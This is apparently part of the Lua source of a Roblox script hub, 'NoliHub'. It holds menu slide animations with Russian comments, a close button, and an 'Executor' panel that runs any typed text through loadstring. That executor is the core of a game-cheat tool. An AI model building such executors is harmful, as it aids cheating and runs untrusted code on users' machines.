-- StarterGui.NoliHub.MainFrame.Shadow.Menu.Move
local function C_c0()
local script = G2L["c0"];
	local TweenService = game:GetService("TweenService")
	
	local guiElement = script.Parent -- GUI элемент, который нужно переместить
	local boolValue = script.Parent.MoveThis -- BoolValue элемент, который управляет анимацией
	
	-- Функция для плавного перемещения GUI элемента
	local function moveGuiElement(units, direction, time, onComplete)
		-- Задаем целевую позицию в зависимости от направления и количества единиц
		local targetPosition
		if direction == "up" then
			targetPosition = guiElement.Position + UDim2.new(0, 0, -units / 100, 0)
		elseif direction == "down" then
			targetPosition = guiElement.Position + UDim2.new(0, 0, units / 100, 0)
		elseif direction == "left" then
			targetPosition = guiElement.Position + UDim2.new(-units / 100, 0, 0, 0)
		elseif direction == "right" then
			targetPosition = guiElement.Position + UDim2.new(units / 100, 0, 0, 0)
		else
			warn("Invalid direction specified. Use 'up', 'down', 'left', or 'right'.")
			return
		end
	
		local tweenInfo = TweenInfo.new(
			time, -- Время анимации
			Enum.EasingStyle.Sine, -- Стиль плавности
			Enum.EasingDirection.In, -- Направление анимации
			0, -- Повторение (0 = без повторения)
			false, -- Обратная анимация
			0 -- Задержка перед началом
		)
	
		local tween = TweenService:Create(guiElement, tweenInfo, {Position = targetPosition})
	
		-- Добавляем действие, которое выполняется после завершения анимации
		tween.Completed:Connect(function()
			if onComplete then
				onComplete()
			end
		end)
	
		tween:Play()
	end
	
	-- Функция для запуска анимации влево
	local function startLeftAnimation()
		moveGuiElement(265, "left", 1, function()
			print("Анимация влево завершена, действие выполнено.")
		end)
	end
	
	-- Функция для запуска анимации вправо
	local function startRightAnimation()
		moveGuiElement(265, "right", 1, function()
			print("Анимация вправо завершена, действие выполнено.")
		end)
	end
	
	-- Отслеживаем изменения значения BoolValue
	boolValue:GetPropertyChangedSignal("Value"):Connect(function()
		if boolValue.Value then
			-- Если значение true, то перемещаем влево
			startLeftAnimation()
		else
			-- Если значение false, то перемещаем вправо
			startRightAnimation()
		end
	end)
	
	-- Если BoolValue уже true, запускаем анимацию влево сразу
	if boolValue.Value then
		startLeftAnimation()
	else
		-- Если значение false, запускаем анимацию вправо
		startRightAnimation()
	end
	
end;
task.spawn(C_c0);
-- StarterGui.NoliHub.MainFrame.Shadow.Menu.Close.LocalScript
local function C_c4()
local script = G2L["c4"];
	local button = script.Parent
	
	local function leftClick()
	script.Parent.Parent.MoveThis.Value = false
	wait(1)
	script.Parent.Parent.Parent.Parent.Shadow.BoolValue.Value = false
	end
	
	button.MouseButton1Click:Connect(leftClick)
end;
task.spawn(C_c4);
-- StarterGui.NoliHub.MainFrame.Shadow.Menu.Screens.Main.Executor.Func
local function C_ce()
local script = G2L["ce"];
	local ExecuteButton = script.Parent.Execute
	local ClearButton = script.Parent.Clear
	local ScriptBox = script.Parent.Code
	-- button functionality
	ExecuteButton.MouseButton1Click:Connect(function()
		local script = ScriptBox.Text
		local func = loadstring(script)
		if func then
			func()
		end
	end)
	
	ClearButton.MouseButton1Click:Connect(function()
		ScriptBox.Text = ''
	end)
end;
